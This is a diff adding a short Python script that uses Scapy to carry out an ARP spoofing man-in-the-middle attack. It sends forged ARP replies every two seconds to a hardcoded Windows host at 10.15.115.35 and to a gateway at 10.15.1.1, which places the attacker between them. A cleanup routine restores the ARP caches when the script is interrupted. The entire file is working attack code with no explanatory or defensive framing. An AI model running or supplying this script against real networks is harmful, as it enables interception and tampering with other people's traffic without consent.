@@ -1,0 +1,25 @@
+from scapy.all import *
+import time
+
+target_ip = "10.15.115.35"   # Windows target
+gateway_ip = "10.15.1.1"     # Gateway
+
+target_mac = getmacbyip(target_ip)
+gateway_mac = getmacbyip(gateway_ip)
+
+def spoof():
+    while True:
+        # Spoof target (claim to be the gateway)
+        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))
+        # Spoof gateway (claim to be the target)
+        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
+        time.sleep(2)  # Send ARP replies every 2 seconds
+
+try:
+    spoof()
+except KeyboardInterrupt:
+    print("\n[!] Restoring ARP tables...")
+    # Restore ARP cache
+    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
+    print("[+] MITM stopped. ARP tables restored.")
